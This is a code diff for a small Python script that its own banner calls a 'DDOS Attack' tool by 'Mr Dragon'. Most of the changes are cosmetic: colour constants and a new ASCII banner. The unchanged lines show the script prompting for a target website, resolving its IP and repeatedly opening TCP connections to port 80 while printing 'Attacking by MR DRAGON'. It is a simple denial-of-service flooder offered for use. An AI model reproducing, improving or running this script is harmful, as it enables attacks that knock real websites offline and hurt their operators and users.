@@ -1,23 +1,25 @@
 import os,sys,socket,time
-def slowtype(t):
-   for D in t+ "\n":
-	   sys.stdout.write(D) 
-	   sys.stdout.flush()
-	   time.sleep(6/100)
+B = "\033[34;1m" # Blue light
+YY = "\033[33;1m" # Yellow light
+GG = "\033[32;1m" # Green light
+WW = "\033[0;1m"  # White light
+RR = "\033[31;1m" # Red light
+CC = "\033[36;1m" # Cyan light
+B = "\033[34m"    # Blue
+Y = "\033[33m"    # Yellow
+G = "\033[32m"    # Green
+W = "\033[0m"     # White
+R = "\033[31m"    # Red
+PU = "\033[2;35m" #purple
 os.system('clear')
-print("""\033[31m
-.----. .----.   .--.   .---.  .----. .-. .-.
-| {}  \| {}  } / {} \ /   __}/  {}  \|  `| |
-|     /| .-. \/  /\  \\  {_ }\      /|| \   |
-`----' `-' `-'`-'  `-' `---'  `----' `-' `-'
- _  _    ___  _  _   
-| || |  / _ \| || |  
-| || |_| | | | || |_ 
-|__   _| |_| |__   _|
-   |_|  \___/   |_|  
-                     '""")
-slowtype("\033[31mWelcom To DDOS Attack py Mr Dragon")
-ip =input ("\033[33;1mEnter ip website : ")
+print (R+""" _____   _____    _____   _____   _____        
+| ____| |  _  \  /  _  \ /  _  \ |  _  \       
+| |__   | |_| |  | | | | | | | | | |_| |       
+|  __|  |  _  /  | | | | | | | | |  _  /       
+| |___  | | \ \  | |_| | | |_| | | | \ \       
+|_____| |_|  \_\ \_____/ \_____/ |_|  \_\      """)
+print("")
+ip =input (CC+"Enter URL website : ")
 try:
     Web_ip = socket.gethostbyname(ip)
 except:
@@ -36,7 +38,7 @@ def con():
         try:
             sock=socket.socket(socket.AF_INET ,socket.SOCK_STREAM)
             conn = sock.connect_ex((ip,80))
-            data = "[\033[32;1m√√√ ]Attacking by MR DRAGON: {} : Port: {}".format(ip,"80")
+            data = GG+"[√√√ ]Attacking by MR DRAGON: {} : Port: {}".format(ip,"80")
             if conn == 0:
                 print(data)
             else:
